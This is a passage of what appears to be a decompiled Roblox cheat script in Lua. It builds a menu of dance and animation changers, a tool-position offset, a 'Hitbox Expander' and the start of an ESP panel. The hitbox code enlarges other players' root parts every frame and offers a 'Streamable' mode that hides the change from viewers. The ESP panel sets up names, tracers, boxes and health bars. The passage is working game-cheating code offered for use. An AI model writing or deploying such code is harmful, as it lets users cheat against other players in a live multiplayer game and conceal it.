					StopDance(p_u_1048)
				else
					PlayDance(p_u_1048)
				end
			end
		end
	})
end
AddDanceToggle("Floss", "Floss")
AddDanceToggle("Hyper Flex", "HyperDance")
AddDanceToggle("Yung Blud", "YungBlud")
CustomDanceId = ""
CurrentDanceTracks = {}
preventDefaultWalk = false
removeAnimConn = nil
animPlayedConn = nil
legsAnchored = false
player = game.Players.LocalPlayer
Tab1:AddToggle("DisableDefaultWalking", {
	["Text"] = "Freeze Character",
	["Default"] = false,
	["Callback"] = function(p1051)
		preventDefaultWalk = p1051
		local v1052 = player.Character
		if v1052 then
			local v1053 = v1052:FindFirstChild("Animate")
			if preventDefaultWalk then
				if v1053 then
					v1053.Disabled = true
				end
			else
				if v1053 then
					v1053.Disabled = false
				end
				if currentEmoteTrack then
					currentEmoteTrack:Stop()
					currentEmoteTrack = nil
				end
			end
		end
	end
})
animationPackFunction = nil
animationPackActive = false
function AnimationPack(p1054)
	repeat
		wait()
	until game:IsLoaded() and p1054:FindFirstChild("FULLY_LOADED_CHAR") and (game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPack") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPlusPack"))
	local v1055 = game.ReplicatedStorage.ClientAnimations
	local v1056, v1057, v1058 = pairs({
		"Lean",
		"Lay",
		"Dance1",
		"Dance2",
		"Greet",
		"Chest Pump",
		"Praying",
		"TheDefault",
		"Sturdy",
		"Rossy",
		"Griddy",
		"TPose",
		"SpeedBlitz"
	})
	while true do
		local v1059, v1060 = v1056(v1057, v1058)
		if v1059 == nil then
			break
		end
		v1058 = v1059
		local v1061 = v1055:FindFirstChild(v1060)
		if v1061 then
			v1061:Destroy()
		end
	end
	local v1062 = {
		["Lean"] = "rbxassetid://3152375249",
		["Lay"] = "rbxassetid://3152378852",
		["Dance1"] = "rbxassetid://3189773368",
		["Dance2"] = "rbxassetid://3189776546",
		["Greet"] = "rbxassetid://3189777795",
		["Chest Pump"] = "rbxassetid://3189779152",
		["Praying"] = "rbxassetid://3487719500",
		["TheDefault"] = "rbxassetid://11710529975",
		["Sturdy"] = "rbxassetid://11710524717",
		["Rossy"] = "rbxassetid://11710527244",
		["Griddy"] = "rbxassetid://11710529220",
		["TPose"] = "rbxassetid://11710524200",
		["SpeedBlitz"] = "rbxassetid://11710541744"
	}
	local v1063, v1064, v1065 = pairs(v1062)
	while true do
		local v1066
		v1065, v1066 = v1063(v1064, v1065)
		if v1065 == nil then
			break
		end
		local v1067 = Instance.new("Animation", v1055)
		v1067.Name = v1065
		v1067.AnimationId = v1066
	end
	local v1068 = game.Players.LocalPlayer
	local v1069 = v1068.PlayerGui.MainScreenGui
	local v_u_1070 = v1069.AnimationPack
	local v_u_1071 = v1069.AnimationPlusPack
	v_u_1070.Visible = true
	v_u_1071.Visible = true
	local v1072 = p1054:WaitForChild("Humanoid")
	local v1073, v1074, v1075 = pairs(v1062)
	local v_u_1076 = {}
	while true do
		local v1077
		v1075, v1077 = v1073(v1074, v1075)
		if v1075 == nil then
			break
		end
		v_u_1076[v1075] = v1072:LoadAnimation(v1055:WaitForChild(v1075))
	end
	local function v1083(p1078)
		local v1079, v1080, v1081 = pairs(p1078:GetChildren())
		while true do
			local v1082
			v1081, v1082 = v1079(v1080, v1081)
			if v1081 == nil then
				break
			end
			if v1082:IsA("TextButton") then
				v1082.Name = v1082.Text:gsub(" ", ""):gsub("TheDefault", "TheDefault"):gsub("TPose", "TPose") .. "Button"
			end
		end
	end
	v1083(v_u_1070.ScrollingFrame)
	v1083(v_u_1071.ScrollingFrame)
	local function v_u_1088()
		-- upvalues: (ref) v_u_1076
		local v1084, v1085, v1086 = pairs(v_u_1076)
		while true do
			local v1087
			v1086, v1087 = v1084(v1085, v1086)
			if v1086 == nil then
				break
			end
			v1087:Stop()
		end
	end
	local function v1092(p1089, p_u_1090)
		-- upvalues: (ref) v_u_1076, (ref) v_u_1088
		local v1091 = p1089:FindFirstChild(p_u_1090 .. "Button")
		if v1091 and v_u_1076[p_u_1090] then
			v1091.MouseButton1Click:Connect(function()
				-- upvalues: (ref) v_u_1088, (ref) v_u_1076, (ref) p_u_1090
				v_u_1088()
				v_u_1076[p_u_1090]:Play()
			end)
		end
	end
	local v1093, v1094, v1095 = pairs(v1062)
	local v_u_1096 = v_u_1088
	while true do
		local v1097
		v1095, v1097 = v1093(v1094, v1095)
		if v1095 == nil then
			break
		end
		v1092(v_u_1070.ScrollingFrame, v1095)
		v1092(v_u_1071.ScrollingFrame, v1095)
	end
	v_u_1070.MouseButton1Click:Connect(function()
		-- upvalues: (ref) v_u_1070, (ref) v_u_1071
		if not v_u_1070.ScrollingFrame.Visible then
			v_u_1070.ScrollingFrame.Visible = true
			v_u_1070.CloseButton.Visible = true
			v_u_1071.Visible = false
		end
	end)
	v_u_1071.MouseButton1Click:Connect(function()
		-- upvalues: (ref) v_u_1071, (ref) v_u_1070
		if not v_u_1071.ScrollingFrame.Visible then
			v_u_1071.ScrollingFrame.Visible = true
			v_u_1071.CloseButton.Visible = true
			v_u_1070.Visible = false
		end
	end)
	v_u_1070.CloseButton.MouseButton1Click:Connect(function()
		-- upvalues: (ref) v_u_1070, (ref) v_u_1071
		if v_u_1070.ScrollingFrame.Visible then
			v_u_1070.ScrollingFrame.Visible = false
			v_u_1070.CloseButton.Visible = false
			v_u_1071.Visible = true
		end
	end)
	v_u_1071.CloseButton.MouseButton1Click:Connect(function()
		-- upvalues: (ref) v_u_1071, (ref) v_u_1070
		if v_u_1071.ScrollingFrame.Visible then
			v_u_1071.ScrollingFrame.Visible = false
			v_u_1071.CloseButton.Visible = false
			v_u_1070.Visible = true
		end
	end)
	v1072.Running:Connect(v_u_1096)
	v1068.CharacterAdded:Connect(function(p1098)
		-- upvalues: (ref) v_u_1096
		v_u_1096()
		AnimationPack(p1098)
	end)
end
function EnableAnimationPack()
	if not animationPackActive then
		local v1099 = game.Players.LocalPlayer
		animationPackActive = true
		AnimationPack(v1099.Character)
	end
end
function DisableAnimationPack()
	if animationPackActive then
		local v1100 = game.Players.LocalPlayer
		local v1101 = v1100.Character
		if v1101 then
			v1101 = v1100.Character:FindFirstChildOfClass("Humanoid")
		end
		if v1101 then
			local v1102, v1103, v1104 = pairs(v1101:GetPlayingAnimationTracks())
			while true do
				local v1105
				v1104, v1105 = v1102(v1103, v1104)
				if v1104 == nil then
					break
				end
				v1105:Stop()
			end
		end
		local v1106 = v1100.PlayerGui.MainScreenGui:FindFirstChild("AnimationPack")
		if v1106 then
			v1106.Visible = false
		end
		local v1107 = v1100.PlayerGui.MainScreenGui:FindFirstChild("AnimationPlusPack")
		if v1107 then
			v1107.Visible = false
		end
		animationPackActive = false
	end
end
player = game.Players.LocalPlayer
targetAnimSpeed = 1
isEnabled = false
function calculateSpeed(p1108)
	if p1108 >= 0 then
		return math.max(p1108, 0.01)
	else
		return 1 / math.abs(p1108)
	end
end
function updateAnimationSpeed(p1109)
	local v1110 = calculateSpeed(targetAnimSpeed)
	local v1111, v1112, v1113 = pairs(p1109:GetPlayingAnimationTracks())
	while true do
		local v1114
		v1113, v1114 = v1111(v1112, v1113)
		if v1113 == nil then
			break
		end
		v1114:AdjustSpeed(v1110)
	end
end
function setupAnimator(p1115)
	local v1116 = p1115:FindFirstChildOfClass("Animator")
	if v1116 and not animPlayedConn then
		animPlayedConn = v1116.AnimationPlayed:Connect(function(p1117)
			if isEnabled then
				p1117:AdjustSpeed(calculateSpeed(targetAnimSpeed))
			end
		end)
	end
end
Tab1:AddToggle("AnimSpeedBoost", {
	["Text"] = "Enable",
	["Default"] = false,
	["Callback"] = function(p1118)
		local v1119 = (player.Character or player.CharacterAdded:Wait()):FindFirstChildOfClass("Humanoid")
		if v1119 then
			isEnabled = p1118
			setupAnimator(v1119)
			if isEnabled then
				updateAnimationSpeed(v1119)
			else
				local v1120, v1121, v1122 = pairs(v1119:GetPlayingAnimationTracks())
				while true do
					local v1123
					v1122, v1123 = v1120(v1121, v1122)
					if v1122 == nil then
						break
					end
					v1123:AdjustSpeed(1)
				end
			end
		end
	end
})
Tab1:AddSlider("AnimSpeedMultiplier", {
	["Text"] = "Animation Speed",
	["Default"] = 1,
	["Min"] = -10,
	["Max"] = 250,
	["Rounding"] = 0,
	["Callback"] = function(p1124)
		targetAnimSpeed = p1124
		local v1125 = isEnabled and (player.Character or player.CharacterAdded:Wait()):FindFirstChildOfClass("Humanoid")
		if v1125 then
			updateAnimationSpeed(v1125)
		end
	end
})
Tab1:AddInput("CustomDanceInput", {
	["Text"] = "Custom Dance Emote",
	["Default"] = "",
	["Numeric"] = true,
	["Placeholder"] = "Enter AnimationClip ID",
	["Callback"] = function(p1126)
		CustomDanceId = p1126
	end
})
Tab1:AddButton("Play Custom Dance", function()
	if CustomDanceId == "" or not tonumber(CustomDanceId) then
		warn("Invalid AnimationId!")
		return
	else
		local v1127 = player.Character
		if v1127 then
			local v1128 = v1127:FindFirstChildOfClass("Humanoid")
			if v1128 then
				local v1129, v1130, v1131 = pairs(CurrentDanceTracks)
				while true do
					local v1132
					v1131, v1132 = v1129(v1130, v1131)
					if v1131 == nil then
						break
					end
					if v1132 then
						v1132:Stop()
						v1132:Destroy()
						CurrentDanceTracks[v1131] = nil
						Tab2:SetToggle(v1131 .. "Toggle", false)
					end
				end
				local v1133 = Instance.new("Animation")
				v1133.AnimationId = "rbxassetid://" .. CustomDanceId
				local v1134 = v1128:LoadAnimation(v1133)
				v1134.Priority = Enum.AnimationPriority.Action
				v1134:Play()
				CurrentDanceTracks.CustomDance = v1134
			end
		else
			return
		end
	end
end)
Tab1:AddButton("Stop Custom Dance", function()
	local v1135 = CurrentDanceTracks.CustomDance
	if v1135 then
		v1135:Stop()
		v1135:Destroy()
		CurrentDanceTracks.CustomDance = nil
	end
end)
local v_u_1136 = game:GetService("Players")
local _ = v_u_1136.LocalPlayer
CurrentDanceTracks = CurrentDanceTracks or {}
KeepOnDeath = false
AnimationOptions = {
	["Idle1"] = "http://www.roblox.com/asset/?id=10921259953",
	["Idle2"] = "http://www.roblox.com/asset/?id=10921258489",
	["Walk"] = "http://www.roblox.com/asset/?id=10921269718",
	["Run"] = "http://www.roblox.com/asset/?id=10921261968",
	["Jump"] = "http://www.roblox.com/asset/?id=10921263860",
	["Climb"] = "http://www.roblox.com/asset/?id=10921257536",
	["Fall"] = "http://www.roblox.com/asset/?id=10921262864"
}
AnimationSets = {
	["Default"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=10921259953",
		["idle2"] = "http://www.roblox.com/asset/?id=10921258489",
		["walk"] = "http://www.roblox.com/asset/?id=10921269718",
		["run"] = "http://www.roblox.com/asset/?id=10921261968",
		["jump"] = "http://www.roblox.com/asset/?id=10921263860",
		["climb"] = "http://www.roblox.com/asset/?id=109212575364",
		["fall"] = "http://www.roblox.com/asset/?id=10921262864"
	},
	["Ninja"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=656117400",
		["idle2"] = "http://www.roblox.com/asset/?id=656118341",
		["walk"] = "http://www.roblox.com/asset/?id=656121766",
		["run"] = "http://www.roblox.com/asset/?id=656118852",
		["jump"] = "http://www.roblox.com/asset/?id=656117878",
		["climb"] = "http://www.roblox.com/asset/?id=656114359",
		["fall"] = "http://www.roblox.com/asset/?id=656115606"
	},
	["Superhero"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=616111295",
		["idle2"] = "http://www.roblox.com/asset/?id=616113536",
		["walk"] = "http://www.roblox.com/asset/?id=616122287",
		["run"] = "http://www.roblox.com/asset/?id=616117076",
		["jump"] = "http://www.roblox.com/asset/?id=616115533",
		["climb"] = "http://www.roblox.com/asset/?id=616104706",
		["fall"] = "http://www.roblox.com/asset/?id=616108001"
	},
	["Robot"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=616088211",
		["idle2"] = "http://www.roblox.com/asset/?id=616089559",
		["walk"] = "http://www.roblox.com/asset/?id=616095330",
		["run"] = "http://www.roblox.com/asset/?id=616091570",
		["jump"] = "http://www.roblox.com/asset/?id=616090535",
		["climb"] = "http://www.roblox.com/asset/?id=616086039",
		["fall"] = "http://www.roblox.com/asset/?id=616087089"
	},
	["Cartoon"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=742637544",
		["idle2"] = "http://www.roblox.com/asset/?id=742638445",
		["walk"] = "http://www.roblox.com/asset/?id=742640026",
		["run"] = "http://www.roblox.com/asset/?id=742638842",
		["jump"] = "http://www.roblox.com/asset/?id=742637942",
		["climb"] = "http://www.roblox.com/asset/?id=742636889",
		["fall"] = "http://www.roblox.com/asset/?id=742637151"
	},
	["Catwalk"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=133806214992291",
		["idle2"] = "http://www.roblox.com/asset/?id=94970088341563",
		["walk"] = "http://www.roblox.com/asset/?id=109168724482748",
		["run"] = "http://www.roblox.com/asset/?id=81024476153754",
		["jump"] = "http://www.roblox.com/asset/?id=116936326516985",
		["climb"] = "http://www.roblox.com/asset/?id=119377220967554",
		["fall"] = "http://www.roblox.com/asset/?id=92294537340807"
	},
	["Zombie"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=616158929",
		["idle2"] = "http://www.roblox.com/asset/?id=616160636",
		["walk"] = "http://www.roblox.com/asset/?id=616168032",
		["run"] = "http://www.roblox.com/asset/?id=616163682",
		["jump"] = "http://www.roblox.com/asset/?id=616161997",
		["climb"] = "http://www.roblox.com/asset/?id=616156119",
		["fall"] = "http://www.roblox.com/asset/?id=616157476"
	},
	["Mage"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=707742142",
		["idle2"] = "http://www.roblox.com/asset/?id=707855907",
		["walk"] = "http://www.roblox.com/asset/?id=707897309",
		["run"] = "http://www.roblox.com/asset/?id=707861613",
		["jump"] = "http://www.roblox.com/asset/?id=707853694",
		["climb"] = "http://www.roblox.com/asset/?id=707826056",
		["fall"] = "http://www.roblox.com/asset/?id=707829716"
	},
	["Pirate"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=750785693",
		["idle2"] = "http://www.roblox.com/asset/?id=750782770",
		["walk"] = "http://www.roblox.com/asset/?id=750785693",
		["run"] = "http://www.roblox.com/asset/?id=750782770",
		["jump"] = "http://www.roblox.com/asset/?id=750782770",
		["climb"] = "http://www.roblox.com/asset/?id=750782770",
		["fall"] = "http://www.roblox.com/asset/?id=750782770"
	},
	["Knight"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=657595757",
		["idle2"] = "http://www.roblox.com/asset/?id=657568135",
		["walk"] = "http://www.roblox.com/asset/?id=657552124",
		["run"] = "http://www.roblox.com/asset/?id=657564596",
		["jump"] = "http://www.roblox.com/asset/?id=657560148",
		["climb"] = "http://www.roblox.com/asset/?id=657556206",
		["fall"] = "http://www.roblox.com/asset/?id=657552124"
	},
	["Vampire"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=1083465857",
		["idle2"] = "http://www.roblox.com/asset/?id=1083465857",
		["walk"] = "http://www.roblox.com/asset/?id=1083465857",
		["run"] = "http://www.roblox.com/asset/?id=1083465857",
		["jump"] = "http://www.roblox.com/asset/?id=1083465857",
		["climb"] = "http://www.roblox.com/asset/?id=1083465857",
		["fall"] = "http://www.roblox.com/asset/?id=1083465857"
	},
	["Bubbly"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=910004836",
		["idle2"] = "http://www.roblox.com/asset/?id=910009958",
		["walk"] = "http://www.roblox.com/asset/?id=910034870",
		["run"] = "http://www.roblox.com/asset/?id=910025107",
		["jump"] = "http://www.roblox.com/asset/?id=910016857",
		["climb"] = "http://www.roblox.com/asset/?id=910009958",
		["fall"] = "http://www.roblox.com/asset/?id=910009958"
	},
	["Elder"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=845386501",
		["idle2"] = "http://www.roblox.com/asset/?id=845397899",
		["walk"] = "http://www.roblox.com/asset/?id=845403856",
		["run"] = "http://www.roblox.com/asset/?id=845386501",
		["jump"] = "http://www.roblox.com/asset/?id=845386501",
		["climb"] = "http://www.roblox.com/asset/?id=845386501",
		["fall"] = "http://www.roblox.com/asset/?id=845386501"
	},
	["Adidas"] = {
		["idle1"] = "http://www.roblox.com/asset/?id=122257458498464",
		["idle2"] = "http://www.roblox.com/asset/?id=102357151005774",
		["walk"] = "http://www.roblox.com/asset/?id=122150855457006",
		["run"] = "http://www.roblox.com/asset/?id=82598234841035",
		["jump"] = "http://www.roblox.com/asset/?id=75290611992385",
		["climb"] = "http://www.roblox.com/asset/?id=88763136693023",
		["fall"] = "http://www.roblox.com/asset/?id=98600215928904"
	}
}
function applyCustomAnimations(p1137)
	if p1137 then
		local v1138 = p1137:FindFirstChild("Animate")
		if v1138 then
			local v1139 = v1138:Clone()
			v1139.idle.Animation1.AnimationId = AnimationOptions.Idle1
			v1139.idle.Animation2.AnimationId = AnimationOptions.Idle2
			v1139.walk.WalkAnim.AnimationId = AnimationOptions.Walk
			v1139.run.RunAnim.AnimationId = AnimationOptions.Run
			v1139.jump.JumpAnim.AnimationId = AnimationOptions.Jump
			v1139.climb.ClimbAnim.AnimationId = AnimationOptions.Climb
			v1139.fall.FallAnim.AnimationId = AnimationOptions.Fall
			v1138:Destroy()
			v1139.Parent = p1137
		end
	else
		return
	end
end
v_u_1039.CharacterAdded:Connect(function(p1140)
	if KeepOnDeath then
		task.wait(1)
		applyCustomAnimations(p1140)
	end
end)
animationNames = {
	"Default",
	"Ninja",
	"Superhero",
	"Robot",
	"Cartoon",
	"Catwalk",
	"Zombie",
	"Mage",
	"Pirate",
	"Knight",
	"Vampire",
	"Bubbly",
	"Elder",
	"Adidas"
}
Tab2:AddDropdown("Idle1Dropdown", {
	["Values"] = animationNames,
	["Default"] = 0,
	["Multi"] = false,
	["Text"] = "Idle1",
	["Callback"] = function(p1141)
		-- upvalues: (ref) v_u_1039
		AnimationOptions.Idle1 = AnimationSets[p1141].idle1
		applyCustomAnimations(v_u_1039.Character)
	end
})
Tab2:AddDropdown("Idle2Dropdown", {
	["Values"] = animationNames,
	["Default"] = 0,
	["Multi"] = false,
	["Text"] = "Idle2",
	["Callback"] = function(p1142)
		-- upvalues: (ref) v_u_1039
		AnimationOptions.Idle2 = AnimationSets[p1142].idle2
		applyCustomAnimations(v_u_1039.Character)
	end
})
Tab2:AddDropdown("WalkDropdown", {
	["Values"] = animationNames,
	["Default"] = 0,
	["Multi"] = false,
	["Text"] = "Walk",
	["Callback"] = function(p1143)
		-- upvalues: (ref) v_u_1039
		AnimationOptions.Walk = AnimationSets[p1143].walk
		applyCustomAnimations(v_u_1039.Character)
	end
})
Tab2:AddDropdown("RunDropdown", {
	["Values"] = animationNames,
	["Default"] = 0,
	["Multi"] = false,
	["Text"] = "Run",
	["Callback"] = function(p1144)
		-- upvalues: (ref) v_u_1039
		AnimationOptions.Run = AnimationSets[p1144].run
		applyCustomAnimations(v_u_1039.Character)
	end
})
Tab2:AddDropdown("JumpDropdown", {
	["Values"] = animationNames,
	["Default"] = 0,
	["Multi"] = false,
	["Text"] = "Jump",
	["Callback"] = function(p1145)
		-- upvalues: (ref) v_u_1039
		AnimationOptions.Jump = AnimationSets[p1145].jump
		applyCustomAnimations(v_u_1039.Character)
	end
})
Tab2:AddDropdown("ClimbDropdown", {
	["Values"] = animationNames,
	["Default"] = 0,
	["Multi"] = false,
	["Text"] = "Climb",
	["Callback"] = function(p1146)
		-- upvalues: (ref) v_u_1039
		AnimationOptions.Climb = AnimationSets[p1146].climb
		applyCustomAnimations(v_u_1039.Character)
	end
})
Tab2:AddDropdown("FallDropdown", {
	["Values"] = animationNames,
	["Default"] = 0,
	["Multi"] = false,
	["Text"] = "Fall",
	["Callback"] = function(p1147)
		-- upvalues: (ref) v_u_1039
		AnimationOptions.Fall = AnimationSets[p1147].fall
		applyCustomAnimations(v_u_1039.Character)
	end
})
Tab2:AddToggle("MyToggle", {
	["Text"] = "Keep On Death",
	["Default"] = false,
	["Callback"] = function(p1148)
		KeepOnDeath = p1148
	end
})
Tab2:AddToggle("AnimationPack", {
	["Text"] = "Animation Packs",
	["Default"] = false,
	["Callback"] = function(p1149)
		if p1149 then
			EnableAnimationPack()
		else
			DisableAnimationPack()
		end
	end
})
TabBox = v22:AddLeftTabbox()
Tab1 = TabBox:AddTab("Tool Pos")
Tab2 = TabBox:AddTab("Hitbox Expander")
offsetEnabled = false
offsetZ = 0
offsetY = 0
offsetX = 0
Tab1:AddToggle("Enable", {
	["Text"] = "Enable",
	["Default"] = false
}):AddKeyPicker("EnableKeybind", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Tool Position",
	["NoUI"] = false,
	["SyncToggleState"] = false,
	["Callback"] = function(p1150)
		-- upvalues: (ref) v_u_561, (ref) v_u_1039
		if v_u_561:GetFocusedTextBox() then
			return false
		end
		offsetEnabled = p1150
		local v1151 = not p1150 and v_u_1039.Character
		if v1151 then
			local v1152 = v1151:FindFirstChild("RightHand") or v1151:FindFirstChild("Right Arm")
			local v1153 = v1151:FindFirstChildOfClass("Tool")
			if v1152 and v1153 then
				local v1154 = v1152:FindFirstChild("CustomGrip")
				if v1154 then
					v1154:Destroy()
				end
				local v1155 = v1153:FindFirstChild("Handle")
				if v1155 then
					local v1156 = Instance.new("Weld")
					v1156.Name = "RightGrip"
					v1156.Part0 = v1152
					v1156.Part1 = v1155
					v1156.C0 = CFrame.new()
					v1156.C1 = CFrame.new()
					v1156.Parent = v1152
				end
			end
		end
	end
}):OnChanged(function(p1157)
	-- upvalues: (ref) v_u_1039
	offsetEnabled = p1157
	local v1158 = not p1157 and v_u_1039.Character
	if v1158 then
		local v1159 = v1158:FindFirstChild("RightHand") or v1158:FindFirstChild("Right Arm")
		local v1160 = v1158:FindFirstChildOfClass("Tool")
		if v1159 and v1160 then
			local v1161 = v1159:FindFirstChild("CustomGrip")
			if v1161 then
				v1161:Destroy()
			end
			local v1162 = v1160:FindFirstChild("Handle")
			if v1162 then
				local v1163 = Instance.new("Weld")
				v1163.Name = "RightGrip"
				v1163.Part0 = v1159
				v1163.Part1 = v1162
				v1163.C0 = CFrame.new()
				v1163.C1 = CFrame.new()
				v1163.Parent = v1159
			end
		end
	end
end)
Tab1:AddSlider("Tool_X", {
	["Text"] = "Custom X",
	["Default"] = 0,
	["Min"] = -99,
	["Max"] = 100,
	["Rounding"] = 1
}):OnChanged(function(p1164)
	offsetX = p1164
end)
Tab1:AddSlider("Tool_Y", {
	["Text"] = "Custom Y",
	["Default"] = 0,
	["Min"] = -99,
	["Max"] = 100,
	["Rounding"] = 1
}):OnChanged(function(p1165)
	offsetY = p1165
end)
Tab1:AddSlider("Tool_Z", {
	["Text"] = "Custom Z",
	["Default"] = 0,
	["Min"] = -99,
	["Max"] = 100,
	["Rounding"] = 1
}):OnChanged(function(p1166)
	offsetZ = p1166
end)
function getRightHand(p1167)
	if p1167 then
		p1167 = p1167:FindFirstChild("RightHand") or p1167:FindFirstChild("Right Arm")
	end
	return p1167
end
function setupManualWeld(p1168)
	-- upvalues: (ref) v_u_1039
	local v1169 = v_u_1039.Character
	if v1169 then
		local v1170 = getRightHand(v1169)
		if p1168 then
			p1168 = p1168:FindFirstChild("Handle")
		end
		if v1170 and p1168 then
			local v1171 = v1170:FindFirstChild("RightGrip")
			if v1171 then
				v1171:Destroy()
			end
			local v1172 = v1170:FindFirstChild("CustomGrip")
			if v1172 then
				v1172:Destroy()
			end
			local v1173 = Instance.new("Weld")
			v1173.Name = "CustomGrip"
			v1173.Part0 = v1170
			v1173.Part1 = p1168
			v1173.C0 = CFrame.new(offsetX, offsetY, offsetZ)
			v1173.Parent = v1170
		end
	else
		return
	end
end
v1038.RenderStepped:Connect(function()
	-- upvalues: (ref) v_u_1039
	local v1174 = v_u_1039.Character
	if v1174 then
		local v1175 = getRightHand(v1174)
		if v1175 then
			local v1176 = v1174:FindFirstChildOfClass("Tool")
			if v1176 then
				if offsetEnabled then
					local v1177 = v1176:FindFirstChild("Handle")
					if v1177 then
						local v1178 = v1175:FindFirstChild("CustomGrip")
						if v1178 then
							if v1178.Part1 ~= v1177 or v1178.Part0 ~= v1175 then
								v1178:Destroy()
								setupManualWeld(v1176)
							else
								v1178.C0 = CFrame.new(offsetX, offsetY, offsetZ)
							end
						else
							setupManualWeld(v1176)
						end
					end
				else
					return
				end
			else
				local v1179 = v1175:FindFirstChild("CustomGrip")
				if v1179 then
					v1179:Destroy()
				end
				return
			end
		else
			return
		end
	else
		return
	end
end)
hitboxEnabled = false
hitboxExpanderEnabled = false
hitboxSize = 5
hitboxTransparency = 0.5
disableOnKnocked = false
disableOnLowHP = false
performanceMode = false
streamableMode = false
originalSizes = {}
lowHPPlayers = {}
knockedPlayers = {}
local function v_u_1182(p1180, p1181)
	if originalSizes[p1181] then
		p1180.Size = originalSizes[p1181]
		p1180.Transparency = 1
		p1180.Material = Enum.Material.Plastic
		p1180.BrickColor = BrickColor.new("Medium stone grey")
		p1180.CanCollide = true
	end
end
function updateHitboxes()
	-- upvalues: (ref) v_u_1136, (ref) v_u_1039, (ref) v_u_1182
	local v1183 = v_u_1136
	local v1184, v1185, v1186 = ipairs(v1183:GetPlayers())
	while true do
		local v1187
		v1186, v1187 = v1184(v1185, v1186)
		if v1186 == nil then
			break
		end
		if v1187 ~= v_u_1039 and v1187.Character and (v1187.Character:FindFirstChild("HumanoidRootPart") and v1187.Character:FindFirstChild("Humanoid")) then
			local v1188 = v1187.Character.HumanoidRootPart
			local v1189 = v1187.Character.Humanoid
			local v1190 = v1187.Character:FindFirstChild("BodyEffects")
			if v1190 then
				v1190 = v1190:FindFirstChild("K.O")
			end
			if disableOnLowHP and v1189.Health <= 8 then
				lowHPPlayers[v1187] = true
				v_u_1182(v1188, v1187)
			elseif disableOnKnocked and (v1190 and v1190.Value == true) then
				knockedPlayers[v1187] = true
				v_u_1182(v1188, v1187)
			else
				lowHPPlayers[v1187] = nil
				knockedPlayers[v1187] = nil
				if hitboxEnabled and hitboxExpanderEnabled then
					if not originalSizes[v1187] then
						originalSizes[v1187] = v1188.Size
					end
					v1188.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
					if streamableMode then
						v1188.Transparency = 1
						v1188.Material = Enum.Material.Plastic
						v1188.BrickColor = BrickColor.new("Medium stone grey")
						v1188.CanCollide = true
					else
						v1188.Transparency = hitboxTransparency
						v1188.Material = Enum.Material.ForceField
						v1188.BrickColor = BrickColor.new("Institutional white")
						v1188.CanCollide = false
					end
				else
					v_u_1182(v1188, v1187)
				end
			end
		end
	end
end
performanceUpdateTimer = 0
v1038.RenderStepped:Connect(function(p1191)
	if performanceMode then
		performanceUpdateTimer = performanceUpdateTimer + p1191
		if performanceUpdateTimer >= 0.2 then
			pcall(updateHitboxes)
			performanceUpdateTimer = 0
		end
	else
		pcall(updateHitboxes)
	end
end)
hitboxExpanderBind = Tab2:AddToggle("HitboxToggle", {
	["Text"] = "Enable",
	["Default"] = false,
	["Callback"] = function(p1192)
		hitboxEnabled = p1192
		hitboxExpanderEnabled = p1192
		streamableMode = false
	end
}):AddKeyPicker("HitboxExpanderBind", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Hitbox Expander",
	["NoUI"] = false,
	["SyncToggleState"] = false,
	["Callback"] = function(p1193)
		-- upvalues: (ref) v_u_561
		if v_u_561:GetFocusedTextBox() then
			hitboxExpanderBind:SetValue(false)
			hitboxExpanderEnabled = false
		elseif hitboxEnabled then
			hitboxExpanderEnabled = p1193
		else
			hitboxExpanderBind:SetValue(false)
			hitboxExpanderEnabled = false
		end
	end
})
Tab2:AddToggle("StreamableMode", {
	["Text"] = "Streamable",
	["Default"] = false,
	["Callback"] = function(p1194)
		streamableMode = p1194
	end
})
Tab2:AddToggle("PerformanceMode", {
	["Text"] = "Performance Mode",
	["Default"] = false,
	["Callback"] = function(p1195)
		performanceMode = p1195
	end
})
Tab2:AddToggle("DisableOnKnocked", {
	["Text"] = "Disable on Knocked",
	["Default"] = false,
	["Callback"] = function(p1196)
		disableOnKnocked = p1196
	end
})
Tab2:AddToggle("DisableOnLowHP", {
	["Text"] = "Disable on Low HP",
	["Default"] = false,
	["Callback"] = function(p1197)
		disableOnLowHP = p1197
	end
})
Tab2:AddSlider("HitboxSlider", {
	["Text"] = "Hitbox Size",
	["Min"] = 1,
	["Max"] = 30,
	["Default"] = 5,
	["Rounding"] = 0,
	["Compact"] = false,
	["Callback"] = function(p1198)
		hitboxSize = p1198
	end
})
Tab2:AddSlider("HitboxTransparencySlider", {
	["Text"] = "Hitbox Transparency",
	["Min"] = 0,
	["Max"] = 1,
	["Default"] = 0.5,
	["Rounding"] = 2,
	["Compact"] = false,
	["Callback"] = function(p1199)
		hitboxTransparency = p1199
	end
})
local v1200 = v24:AddLeftTabbox()
local v_u_1201 = v1200:AddTab("Esp")
local v1202 = v1200:AddTab("Settings")
local v_u_1203 = false
local v_u_1204 = false
local v_u_1205 = false
local v_u_1206 = false
local v_u_1207 = false
local v_u_1208 = {
	["Names"] = false,
	["Distance"] = false,
	["Chams"] = false,
	["Tracers"] = false,
	["Box"] = false,
	["HealthBar"] = false,
	["Tool"] = false,
	["Direction"] = false
}
local v_u_1209 = {
	["Names"] = {
		["Color1"] = Color3.fromRGB(255, 255, 255),
		["Color2"] = Color3.fromRGB(255, 255, 255)
	},
	["Distance"] = {
		["Color1"] = Color3.fromRGB(255, 255, 255),
		["Color2"] = Color3.fromRGB(255, 255, 255)
	},
	["Chams"] = {
		["Color1"] = Color3.fromRGB(255, 255, 255),
		["Color2"] = Color3.fromRGB(255, 255, 255)
	},
	["Tracers"] = {
		["Color1"] = Color3.fromRGB(255, 255, 255),
		["Color2"] = Color3.fromRGB(255, 255, 255)
	},
	["Box"] = {
